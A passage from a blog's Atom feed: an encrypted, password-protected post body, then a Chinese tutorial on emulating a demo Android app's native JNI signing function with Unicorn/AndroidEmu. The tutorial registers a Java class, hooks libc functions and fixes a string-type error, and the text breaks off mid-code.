e326bd12efc4d4b2ad998c8f4e3c10128b653c30a22d3b8fb09e52cfd6799d4291d93e8cd380f2c01ba89f3f3c155b8f2c09383d12f406192c2728fef7c158c003b4a1480bccbe2f895daa79ff9c19d7d143f5bdf2885425255139a0dee2338c2a07d84fb9f8ded3da2fbbfaf7fcdcf7232c3fa61a259e8fc3fc1fd55602528178273fc340f63324ae7f39134630a41a01e59123826da9a7702f40e832dc34c35fb850bca57ba610e6d86c6789a8a62aeadbbc999186db0f2e7520addd0cfcbf1054c10d416c2ca9f52cfb0c2160a55b009c2ff7632a1676f9c665f30ed4fdf8c359f29468b5221e79e5fbd98ca336487a63787b36cae5b1068062a34a3bbc539749ba011f42242e5e478ed5e5744e054248947e35587fe27affcfd1dc6f342072f8c6fd571a6016ba4456b29238d18c7cd2d8fb5d0448effe7404c63746ac70840689395485dbeb8c6ea70764877f4079bddaf416f17799f99b38bfbd52a5fd14a2a494f509aa989233df1bd7f827d169ea09f2b369e5ce8b13121f46f01a0e65b3c3037034bc68ab2b96d41a4e6838f9be4b9b910c4bffc422b208652212b4a20da5a3e0766b9afbc07c62516543f74fe71678cf5aa43941f9d6a8ba2c1992a4c2384702fc56d7bda69e7ce4f715f57ccc97bdc8b8713169ca080611cb493a817e10776b48d7709e7e867684fccabb9c19ce127415edc377ac28287880797ade4c1a7cc07bd0a6f6c73483fbe3676bffbc8ba4127734da062797c4bf80246518ef2d00cf59cb27e2cc269be7e848e6b0e8dfa2fb017e15230819c1c2a4fb90ec309ddb8dc3282ee708a04ea874ff00a82df9af540fdd4d507fa43868997a777c81c9546c14af2e7952f6f433e17648e5278dd576e1379f34908b947b082b92b1f2aed59a039ac4f271e017b8fa22faec3c93dbdc1eadb870db479bedc063228164dd206fbfb1abd79743b72fd2e92759b976a81a69b78456d71dccf695fa2246136982c4fb8d615e00697c3c135ec583ec748f9eced42faa3eb9f2c1abca2d5fc2f9c91f46479800248cd9dec343f1ff0d4d87b395b3632897bf3b76fea0f9ca410d754e8ebe326115de0e105839143887ced5019851c3b49adad9923419bcfef7d81e51a4b70d282f3dbfceebbcd9eddc26df07655f0e60024a51208b62b8db59df04f9a96565f0b9b84a1cb914c42d0cfe1dc82fd33699fd65eaffbbb3673faaa4e6cd10484db14f67fd2f7427e31366dc2d6148d7fc38cb5214b0f2d17aef0ec7e2bb0484f3845dd8fb67075fdf1f6901886930c3504162d846c5b422bb12fcf2021bec535e5e8cd232f2b7f179fba1a43e55d9c2de50c3daf4e49a569dd9ffa9846810b161e3409b30fcc5a7769b3371d47b9e840ccc14a272e2df9451e3c59eefeafdf07fbf23b494fe2fd1da4e2236992003f6f826429b9a01333b2f6ab8b32d27ebf9940606f7d988100519d81f03d462bfbcc43c47ec39ba5eec96c65d342485d10764c792ed98db3fe782e0d0dff647dee62d89c29214a9ece57cd54ac137aa2d3725e2a5815cdebce3bca81123ed87dd141806a0008a8d9ad644098072e5fe4ed0944cbbbecf5a2e49c22e3deb74dbcc146204a3b51db6221b1ef10cf316ab26d4303611548cce097c01b29e92b3130d1289d8b536892d03750bf087d8b8b362ee461340de44b9ca73a0756adce261f75f65bf9b7d89cbd893907919f67cfa86f661f85c33407c988cef9700a551f680a4d4ec2a6352812fea5f085b9e297822dadac9e25e75595ee7efd53cbe7864bda76a8873939e8265d06dc089ec5b9fc4e4ed29875c73c8739cfe51cb12bc646edeacac1207397ff1612a20973c8639ae63f8779b6eee4b1ded94cd40fbb0c229db8dfa95d2c18560d11260c0e50c93152e77b116cf27971e154222a514a1ee204f50c2d3c43f5ddc6d4683a1a2bc301209bfcd63d0180daeca265029f298879580610409208c1aa1c061d5b6a3773b6c67e577156478e06d4abf483ac39495346fc1490c182d3f42d5facb42569bf9dbdf52383609556ebf16a0562892fde37cb34c7f3d69434634f5f28b13b6fee07b55177a5fe7c4ff4ee7cf00ae1ab52cfc4ca0a665fbdee9b848c31fb9eaba8878a413b532cea4210be6599ca91b7a48928d44236242df604affc7ac8966b6d9a67d25d9cdc41905ba194dab34c07a88042ca76a572f2ee6661b4d115162549028ccec85847ed86de7a93d86f58031987b01e204da21e06e2494d5bbbe7de061b228dd416fa67771769d4ca97dce440f614266fdacdf9ccffa78f2a3d2d67684f3e13de25f67a658f3cd5855485ab3dd8e78bf10b9b618a29dac0e63e0de50d019da820184e0267e7f63bc1026f0c37eb7d3b4d9a9f545969845456bfeaf8ebac53ebf15a44dfa0f346354c16e06085072c0acf40ea0857c9e662b3a5aa1637a2e317dfc9293514568c8e50152673b122244ed735de9c1bae21bff775e8960c2ce937ac281f315cd8c19f2f6a4369b85bad33e0da561426ee466b85719b4251af749d909928aee0d3acb3007ea0d4d4c695816ace3f92b6c19b8af5e381baebed5232f437178c862d749acd199e0c0fccc95321da78f36e9cee86d04bfbc03c1dc0f038bc4f423f9902c7ebad1d2e760fa789f01c70991571ac04723b97f908105563416730ebccae791674b1ffdc4996fd1f0af68870051819f14897dfc140424102a42fed389a6f282fa673122a3499c0e9fb9f6c30a6b1ca935c69810afbbc8fc5d8227a276bd12fe658c5723345bcfb750cff85abb9fa48ca9184d52009cdf16b1fd251cb1ac7b33721f5c03e99fb6661cd7010c9631cf5d76aac79d49be6da16ebfe021d171f2320926c69c8afee7f8e896fcd3a3669438fff334dedd26cf89397400579be87e7819b4643eb3f77d4b4020287de34e4efa1216b9ab0b55a7c466d7ab0df77b094a87c915ec4b33712445ec08ed986bb72c677dd6340aa055571f10fb7ed58fe890ae3525d384210e74603721ea419fc726120b518d10419d2967f9343d4d7ffdc0c9c4005fffc418fd4274bd0c5ee458feda9eb77df35b7e7e4234cd5fbf92766a5fc923e04ac891fd42b7c3cd317ebe45c674970fe1959f4daec629466e68d4486c83859ac6cb6e1d9a89597c234ef13d6584b659b1d91f9e6cc05ee2070c850e78dc8260cc916cfa05a6dad1c62a8d392b7226601fc88f6f20052b227afd3a1ebb394ed2ec85a19dda67b95811d74bdde3b4db8ef5d597ad53495a1f592e7ed48b4f9c4840c72ba75a946703329f423aa954b9cc9d088867170d84c815a1324aac5b71bc95a0ab7398a051d945a38b5454c2a44b81fa2520510815a981367dcb699abadac968afb41557718002d4df9370500181c068551af1f7b67ede9a629f04b5abaf5564fa8596c8552595d7d4d1f821dfc9bac6889e76b775a1deb22791b01bd5fcc677160d6c6f731a131ea302aa5dbfe8f2ae9c2a049832158cfa2681276e08db562361ce5767b6b656343122c7d835dd8f24928a376540ee8c615c439fdef4ba16698344846441d23ece055d2e57c380fac4ceab0af6492aae85f28a30c1621da5ec9d3210efe9a3991863719accf960cdb43edb02e5834752e3458b481645652169857784a67e417b282562258041ad0603210565f1a1052bf4a13746d1bfb0d8e731db8e5b7ab57707a1d58376f8e24b1402a6ba7ced17f4c197858d1fd24e506cbcdae8de8e8f7d9de7bdf4f88c61b3f7e536f46314f2e90e5fa0040a853ffa56e2db1e0d49e96d796110d630484d475ab44bdacb6ababea823bfe97eea57a84efdb8cdacdb743377d256249e71f2fc711820bb192050fbdba2552ff9938cf84b54d39ead3bdf96bcc65da3a5310da6a4c5f306050bb1257c895649dd218beb2c98c07415df5b8d27691bf7dd81c832a1965e4ac5f8ed737e1fd1a933264b8885bce5a21c166668bdbca8ae2fc5dfcdd137f0e9c2722cdc0aafa8cb4e8bc6858a1455d9f90b50733d26b4e953786c2b11f4d252f7090f4a33e103bd85312e359729faccac9289b12df2dcf13924acf3906d92d88cb95c7e320ec5fc7e973dc5ca5c9de833b3627219b19c8b7694ca0eff58db6e3934b9d3fb39a86bbe6547e0dd2938776bae07da189fde7225ec9845b15d1307e63d8522a69c3d1f1c217b84bcc3eec2a58dbf990f37d04dcb5f299f7cabd4a020cb61b1262eb9def0ea0aadeb0f84d5b914567cf837e1706161ce6dea55658aae42d2d6d6671da3c3fa9cd348b7bb150881cecf7027e03bacfd60fd193ea92e8fcde4742c009d4e56a7a8f311b1d9981b44b8ef53f5bb88bc3000547e582beec71437f9599315eaf62227e40b1160b9bc94375deaf6099884d859c01ad3c1d7133ae7ce69d11a17168e59b30064eb5e7bc3d0220ee4b25ac49182127ed941f2a742a1cd9b88c44e6bf56a6a4e6c3ebc14a8e75a200293f529e7fdb42d87bfb410b4676a774577eb596e3cdfd3877c3d43f7588cf507f39a3b411f28699720b5ffd88198e154b261512d9720b64a2256c9e60e6569d0ab42159a39fc0f4ea60f76ec12548a3f6a1e1e58b2ea675381cb570ec71c8f1934edb61e70609fbbfe4b2f7ce26eb790974d1dd68a4712a518cd0e083811fd76c230ebf715dba9f75695eba2024b1ecca521f912161f9a927eb49cdc7b6a0adda3030e896f5d43e543b549d5947810c2f1a77de6c673b3ded81cb3827eac7cf41b67cefcc1271e321cbd3bec29805b38fa73ab5abe427861e36f63c272c33e764ae31e343ea178eb1ad1d739cd3546ea2a77d80662a5c60bf01cde6c1e147803835e86c31e1a6f326ab36b1979546be2abd45bfec7979660a42974abd13b2971ac1b28793b1a2e9cb95eedeee7cba39e0c500ed73825e40d3ddb0f171988d7dc5c15bc847accd6d145e731b10fc8adc0a5816f6acb12283299d90af276c4f694d339c44e0729788be55fa83a36befaba6ef0418eba94337c1fbce17e1768603f450f9f18c464f3cc301c28b31e732afddfae9f28d7ddd66db645a7cabd59a46b890dc42a57888ca3f403da5ffd18eb88574b3ae60d3c5bedd6b44a00071e2123a202323818d318fb173b976ac0af1cd0cb1ea2b70f8ba12063ab2a187081042e533af99c24f62eec19c351b00c71482416ae49095a9c4b32b2cf14fbbb42a92bc6b1870abc3366a57248e9b39b73dbd7b30b8cfba5bd755b92c2b2e9a4b8118817dee1052dd653f895528a41c75fc41fcaa0786aee0ac656bf51404b14d0e2a85f92d4a5dbbc2fe45693dd4ab679bb26e9c893848c0c443bed092e5ff46e032903c99b7e8c6da9ff20363415cda7902a77fc4c9e28514fe30770a5d622032ad20f42c67d6c1b766411c08e38d68baf98c43a4eaf3dcd85f980182008a9745f17ed94c50b6cab7c3a3dfe8833842685160e3f86aa9342704e9bd626aa4136fa300723dcd7c5675b1037bb8944daa387c2206c487225b887486ee2033480d933bc8f5443dff8fb8a19662b0e7aea1b3493320f6bda40010ed571224529084c846677858d64adad57d41ba6376d9bc86e3f16de5bf3eab2a317933b4e233df6c0329fe8b8eb714212ccf15719cb10da8821f1743b4ab72aae4d8f305f5330b4e28c50516d4969c7f24cc0850aaed480347d1e170e912bda9adfe75865474d554286ee9d37bcae0616a73a7cea88354764ab3b78d95d62c93e339c1aaef1edf5536234c4d9e0c71c3f00a15e90d491566b07f1810fb9fb8eabe456b5d82fdd063637254618ce8a02b8d6c6432457b8061698bb3a6ae3e7e4ea34a626a41541193432d727ba9aa6ff7e263740937665d3676beea66ebe0bbb7212fc798d21b972e2f39a61777847a0217838c4a7a16de54a6dfc9f629fec3d4ce2c27de92cb07f87a3d6a46b47dee9679130793b56d1b9086288882bd3b6048bdd00bb21fba5d97728b2d65ac179f4926c989d7663e6b1ee5c6b225a1a1845a5d9bbca9e35556c2aac5c498ab6aefc73ed7319424935ff3b93bc386caab6a7f527c495a0da36458eebf057d6d5cf4a92acb5c101c9232158bb29bc4adc2b6d8a44fd4c6bd5a20e66cd5b57af3775a06c1a3da8b453fce675ec9405a385698357e25b96dcecf1fc8c52f23191039e22b4fd0f4eebafec8de83f46d4d373816b99d75c82f93e3e49ac0d32cd2dcb3ab7bc55a483cf7a34c4c37f1f557770ec05a00cc66820f89a77a6553750edaa42bdb349e9f901e1434c531402e089766902a0ae666601f654dfaa8411c8877e345ede18172f5c185c07e8a21d1e0da69892c30da05da0cf9636f5e4e2732c51ca32b48ce6a42f9f56fb5f3d87eac8435dced5719fe27c765bee621035bbd224d2ec95c8e8625080022e2f12502b18df081cc9bc8841efda585b4aedb55416d9ae9ce79f821fb0864998140dcb3f5695226bbdfae67ca1c9c501873c7d2cbb21d06ab1a04f3c15b30e4e038ddfefd429f58054074511a657b67327569106fe6dd3f412b7640dd32e2369d72bfc4cd0da6a38f28a3f62eb67512efd4914a5f263b813c953cde36b70a5aa97857d5dd0afbe2208cb444346dc3eb68036c41e814591ebfc4abd13faab09cbb55818b80025cdb001b749ddd20b5c0ea65d154d21620ff047f961bd3e7384d251deb952d1c8bb6cc52696b68efdd77e06791a27a3eee66956317a45114f9b5830a5bc73cf04a8b259aea8706587bb9464a9b77cc6bcf2ad58d4252671443192bb59b56f643692b6e74a1ceb59a4d814ad7e635bd8b4194b2a4402bea989988c327954fc4bfb9026c337e4841b2e88d549389286a5839a6cc4653d9279c10821feeb96c42c37394e3f4e062a5875ae80a1a5c7c9cab9d58464a5f0e99cedae620eccb8e357eed097540d7fab423ac09579f2159e931c3d2eed4a9d094fb38381d5570ee86c39400ab1ab61734043a63dfdd55ebd92f3776b400c24a2339319ea6428206cb569188562c92d859d7c51d2941384a687d2d2fff8d3997f53653fc373298852b83299db98b7b0eb2ea33df2aaa18cae5535a2b5b92f4a7629b386099971779d700d3ca6eb47d049da2fe24b510115a2b6b7f7f0978f10f16ed35058a6b8ad8f660a49e661c9e6d916bf6e67c4e00b74e496453d37457b9e83e0592e91309605a7f7cc0bdebe91246762d03f130fc69768022f2c25afdbe8ba5b05659d53b9b745400f5fbb69905389031d80db69441c866c2d9e0bcd3e4bf70435c8b1acd60b672e49bf20ff83c1d5a224594957fe72aeee3c3583f22c7c7f7aac0198f4bab94c07b94c420234a84ef719e44cb80ffc729e0867ca6320d791871662bc517d493403a3d782ea7a3345887ce23064963ab9bfbf28c27a84ac6c9c19b8782a5d61c4a8fde506e8360f6487e849f5069e16c581c5db5c5cb7e668eba7f611bf7924418fa687b8132de944f6d699dbf7110f2d7434478f1f448459dcd0ea76a32647bd3c037925869bb517d2e248efd43a563b919bded03897000e191c4762235f908e7afd43b479c4f4707104a1dc66714baa8facdc58f9b3b087784beee3d675783440e8302411d58ee37e94214ce612944980d5282e70354f93b13505ddc422800ce217bb489b6de40bc7ad26a3e35d33f80029c01e82555c95697a6466fdb9353cdcee6151b806788246e93bd3fc8c52db062b5f8cab20ac0b513241b7571df94a590d3a2c10adb5c0073a2e581205c1405a7d30396eda7ad0bc3f8e2f98336567f5dac9dbc295703f2137de4b85cb465f1cb71e4a3ad120d81e4589f4e033540c0b98eb3234162f879407f32bd20ce6085c6381bff8771e2c50f4a7e31667ee87e5cd877265bf3c36f84fbbb80fe678888fdb98d3762d4008d171ba38abab1518dba3a49429ef85d7a3cf62c9050047b2199fd927c1e1fa020b3965028a03f0cb3c82a673ab195aca45ac280c45857102e421e01e3b8f9c7f3da11d4430276e3056b4cbadf710cd549e5dcbdfc835767231702f96691a4d7da7c38c0ccae285089c1fd6089f20c52718093a0e697cb9759fac5c7d86a593d6a553ea6090a84294a3915864b2ad40c2b46653d4b3d868691d5e208e50c0e167b9a44e2743133b707fe14bb6064909040b5eb4697ffadb8a0cdea7f0bc748ea55c06a51c28458f357af7a4310fdae8720f44284169c1139f9ebaec9eed32b163b1d7e892f8ff190c73b53da137e03a87e520d470d30115221167e5534139dc165d2292a26d0b00b6f0cc53412bc90cbfc8a96c8eef86a22be2986f52faa4d899dc4151810aa015701b72c7f131942d0a0c57e4ad12718256fffe4362b39614f930b97fb6a5b2e20408eb4e2e3f931b93bd11b67fb2b811e7cf55c9f847a052cdd59ef2be85b06385d7c4efbbd6695f0a69b720bc30b13c287bd9c559d65a40b7375613ab0a4065d069201d6d001f5abf374ebdcddc09fe3e532dc63e084e23bf839250b7baa600c75c0d290ba971498880c8ca71048f25297c672397bab4289cbf90919d5538e1d0e2686f8122363b7b71926c702d29e60eb8156e77771b0d159fc3376464dcf366e603841890b9788e0d1f04d6e37a17ce9e50d8740fdc2fd23a389c8379b578a6647ede2e38d382a47f65ced90fd24bca539b5e63ee7046cad05d819ada2d39a3d5f40d8f337d102b12815c251714ca27f6a3dbb4c865d41f1efa140afd285d4aa66f02d83fc0ce19a6e31443dbd401b15ff0cac266ecf17fe89597574f3eda4ce49576873e4e22524be939d4cd06124306809ae4fc027034b558fefc01d6d9ec191f113778f34cb874f12e34b9ba7ee67f310d94eb4d5cf075027cfc29ddb3ad8a70bc5385224597dc83956ed5759080355a5905766cc27550a142383a06aaa810000e6308ca8621325428187ad102353b31f7a844e058de053a934fc9f50beb97ef90420f2b40b52466f814e26fa00b9f2538942bfe18de8724a961ddf9a9f7dc31482e22c6b2df8e25b662b439342a9ccaa22b0752d7dd0c68929fc0d6f90c3f56d8c3917e29f32d84ca7ad7b0c3eacc1deec5bea1f12c989451d70cbe9b00be3ab15d527fb8a1529a59e413637dcf0a857e6349ba1d9c64b9acb03b1bbe6c7df7c54b8bb70d27a70d5b448f91060dcc4f33532fdb9f0da6dfcb098950dd64c785948b5925480016ec7576566a15fd7d0df259b143bbdb9de5193c565b545d78f84b303b348ac2affc83da02a87ef05cdbdb9496646b0263b3c372b60268d77fa3b88ce020ae09776d5bbf2ca15a4348eda4b39d8b5fa6860801e594d9e31f86fdaa2691937488997a921d1eb0793209d123b5cbe57a92ea801e131556861e7f063c6918f237d4dc0c2d0ad2c9090289807820822cdb8a926977f7781bae685077b20567acaa316d387f4c84608da68b0c36fb5e5c3b1317db27fde008ebe38a919c050b9d9546f1e361cdc0fe3c85b1ee3fd3a25e9998eba76b95ee9178009266ac847c1bdc376a0825ed9d108d38fa7696187d7a47d8b7f6215a28e87e35d383ec79dd62279a955ae43773d8f58052c5dcd27981e1101a7b837ef0d51cf2826d13e9cbdf39eaa4c7e9dd60ea3e4ab204beea52be6fbc53bc10aa5b14daa2887378c45555fa5071716aa7770626785e761b47d8094c213333c5d4eb4d8af98ca0b37454d9f9b1bd4d55d3403a235797b739c69db2f8bba28c9f514964f3154c4ef2c3e92c9b2081571315da53b1c681e01d45da3015ea5e8b8928f9b5f026d3e49569e96397ce7e51cae16efbb40af430a512d203666eeb55ca885eb8b55d322dfdb573662c293717e4be5e746997ae6ca12bf4bd9f506a2cc43c7eb91cfc79a0a236f62709a91d1f4270fd82ced4c7dde908e9449d705db8d74785c8c9f3ec4ce4eee89a683315311a4f70fc4c5537939472c1f4595cfaa341bf962847753d7a3f7870efcfe874577f90f55338b50ad5c553efcf946a5e561d8257b908210f8543859181fdd51213f257b299e4c8793670caf203f066497ac20aa3a4c53fe3c56a2b9d90464ca081d7ecfcc0b99048083f392b5e3c05b0329d6471056de7367f36f01424dd7204a90cb697a9e883820aad2035aaca48be51a893c27d036625f8967a2fa61c032b95f2817a6e4c3858eb409e51105d779797b5b878cd22a0d93576cb6e617ec9e32f3dca12947a3b112da3e188f01c4dbf6b61811ea8af40d6862b86032ffef70c738356ac5bf343e591f8c86470ae60f5184e7b86693fcefdb40ce9347a51496717f8c2127a85c82df9f3757b456fc09d49fca39354ce1c1540d7c8b0acc22a44feb78b8a78397fec31c5e9c87061fb50a928636812e778309d0583101c7ec6ed42614a70689e43e344402263b99e3a1222d3004d765cfa668a4b7c77e042be1de8d9d127dcc3726731307cac3129926978ac72bd3e2ca8b09e151079cc90f9cf2f4cfcef22b4a503e1fc4d6e41dc311c785dd1ec76e6d74e3c5a7c18cb91154cd755919d05cddfbee051e57a6b6cd9580f8a288539de70e22e2b846a4c6910421f74b6bf065d822bf85765c69e921af5b7e70bf226c103513d0077ec108d5e5d93ee7792bb6eddbebf7719f4a8c23b75e17a56b5b16ee37267ddc350ec24135d3b43854f82cdba6f9f94f2c0e8a532c80d0b5ac03a117b09144c287b70c9d6f7e719efd80a20a9d0eae02209bf3c2a8b05acf476bf8e0f29589cd5e54c78d406fe855a6dcadf743d9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">unicorn调用动态注册的函数</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>unicorn_learning4</title>
    <link href="https://pa1r0t.github.io/2022/12/31/unicorn-learning4/"/>
    <id>https://pa1r0t.github.io/2022/12/31/unicorn-learning4/</id>
    <published>2022-12-31T06:12:48.000Z</published>
    <updated>2022-12-31T08:10:21.907Z</updated>
    
    <content type="html"><![CDATA[<p>unicorn_starting</p><p>模拟Jni与Java交互</p><span id="more"></span><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>hook这个函数，其中存在调用java类和java函数</p><p><img data-src="/./../images/image-20221231150501748.png" alt="image-20221231150501748"></p><p>尝试将上一次的代码进行修改后直接执行，观察结果</p><p><img data-src="/./../images/image-20221231153507375.png" alt="image-20221231153507375"></p><h3 id="注册java类和方法"><a href="#注册java类和方法" class="headerlink" title="注册java类和方法"></a>注册java类和方法</h3><p>结果发现不能找到java这个类，下面已经给出申明，直接复制即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">com_sec_udemo_MainActivity</span>(metaclass=JavaClassDef, jvm_name=<span class="string">&quot;com/sec/udemo/MainActivity&quot;</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 添加自定义java类</span></span><br><span class="line">emulator.java_classloader.add_class(com_sec_udemo_MainActivity)</span><br></pre></td></tr></table></figure><p>执行后发现又要声明相关方法:</p><p><img data-src="/./../images/image-20221231154406776.png" alt="image-20221231154406776"></p><p>声明方法：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@java_method_def(<span class="params">name=<span class="string">&#x27;getSaltFromJava&#x27;</span>,signature=<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">                     args_list=[<span class="string">&#x27;jstring&#x27;</span>],native=<span class="literal">False</span></span>) </span><span class="comment"># 这里native=False申明此方法非native方法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSaltFromJava</span>(<span class="params">self,mu,data</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这个函数在java中的功能如下：</p><p><img data-src="/./../images/image-20221231142325743.png" alt="image-20221231142325743"></p><p>这里我们作出拼接返回即可</p><p>执行后再次报错</p><p><img data-src="/./../images/image-20221231155418523.png" alt="image-20221231155418523"></p><p>这里我们缺少jobject对象，这里我们手动创建一下，然后传入进去</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">obj = com_sec_udemo_MainActivity()</span><br><span class="line">sign = emulator.call_symbol(libnat_mod,<span class="string">&#x27;Java_com_sec_udemo_MainActivity_sign_1lv3&#x27;</span>,</span><br><span class="line">emulator.java_vm.jni_env.address_ptr,obj,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(sign)</span><br></pre></td></tr></table></figure><p>然后这里又有相加时出现错误</p><p><img data-src="/./../images/image-20221231160243373.png" alt="image-20221231160243373"></p><p>这里我们调试一下，data的内容：</p><p><img data-src="/./../images/image-20221231160423365.png" alt="image-20221231160423365"></p><p>一看是java string类型，类型展开发现value中value就是python的str类型</p><p><img data-src="/./../images/image-20221231160549317.png" alt="image-20221231160549317"></p><p>修改后成功出结果：</p><p><img data-src="/./../images/image-20221231160712892.png" alt="image-20221231160712892"></p><p>完整代码：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> androidemu.java.helpers.native_method <span class="keyword">import</span> native_method</span><br><span class="line"><span class="keyword">from</span> UnicornTraceDebugger <span class="keyword">import</span> udbg</span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"><span class="keyword">from</span> androidemu.utils <span class="keyword">import</span> memory_helpers</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_classloader <span class="keyword">import</span> JavaClassDef</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_method_def <span class="keyword">import</span> java_method_def</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置logging</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    stream=sys.stdout,</span><br><span class="line">    level=logging.DEBUG,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;</span></span><br><span class="line">                    )</span><br><span class="line"><span class="comment"># 用于打印调试信息</span></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">com_sec_udemo_MainActivity</span>(metaclass=JavaClassDef, jvm_name=<span class="string">&quot;com/sec/udemo/MainActivity&quot;</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="meta">    @java_method_def(<span class="params">name=<span class="string">&#x27;getSaltFromJava&#x27;</span>,signature=<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">                     args_list=[<span class="string">&#x27;jstring&#x27;</span>],native=<span class="literal">False</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getSaltFromJava</span>(<span class="params">self,mu,data</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> data.value.value + <span class="string">&#x27;salt..&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器</span></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__aeabi_memclr</span>(<span class="params">mu,addr,size</span>):</span><br><span class="line">    mu.mem_write(addr,<span class="built_in">bytes</span>(size))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27;</span> % (addr,size))</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__aeabi_memcpy</span>(<span class="params">mu,dist,source,size</span>):</span><br><span class="line">    data = mu.mem_read(source,size)</span><br><span class="line">    mu.mem_write(dist,<span class="built_in">bytes</span>(data))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__aeabi_memcpy (dist:%x,source:%x)&#x27;</span> % (dist,source))</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sprintf</span>(<span class="params">mu,buffer,<span class="built_in">format</span>,arg1,arg2</span>):</span><br><span class="line">    format1 = memory_helpers.read_utf8(mu,<span class="built_in">format</span>)</span><br><span class="line">    data1 = memory_helpers.read_utf8(mu,arg1)</span><br><span class="line">    res = format1 % (data1,arg2)</span><br><span class="line">    mu.mem_write(buffer,<span class="built_in">bytes</span>((res+<span class="string">&#x27;\x00&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;sprintf (%s)&#x27;</span> % (<span class="built_in">format</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建模拟器</span></span><br><span class="line">emulator = Emulator()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容</span></span><br><span class="line"><span class="comment"># 在导入so文件之前hook才生效，导入之后没法hook</span></span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;__aeabi_memclr&#x27;</span>, emulator.hooker.write_function(__aeabi_memclr) + <span class="number">1</span>)</span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;__aeabi_memcpy&#x27;</span>, emulator.hooker.write_function(__aeabi_memcpy) + <span class="number">1</span>)</span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;sprintf&#x27;</span>, emulator.hooker.write_function(sprintf) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加自定义java类</span></span><br><span class="line">emulator.java_classloader.add_class(com_sec_udemo_MainActivity)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载相关so文件</span></span><br><span class="line"><span class="comment"># do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作，</span></span><br><span class="line"><span class="comment"># 这可能会涉及更多库的调用</span></span><br><span class="line">emulator.load_library(<span class="string">&#x27;./lib/libc.so&#x27;</span>,do_init=<span class="literal">False</span>)</span><br><span class="line">libnat_mod = emulator.load_library(<span class="string">&#x27;./lib/libnative-lib.so&#x27;</span>,do_init=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址</span></span><br><span class="line">dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始执行想要执行的jni函数</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 根据so模块调用指定的函数，后面都是函数的参数</span></span><br><span class="line">    <span class="comment"># 参数1: JNIEnv</span></span><br><span class="line">    <span class="comment"># 参数2: 是java类的对象，这里填0即可</span></span><br><span class="line">    <span class="comment"># 参数3: 是函数输入字符串</span></span><br><span class="line">    obj = 